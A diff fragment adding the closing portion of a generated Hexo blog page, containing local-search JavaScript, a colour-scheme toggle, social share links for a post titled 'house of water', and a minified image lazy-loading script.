+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + house%20of%20water + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2Ff2ba450b.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/f2ba450b.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</html>
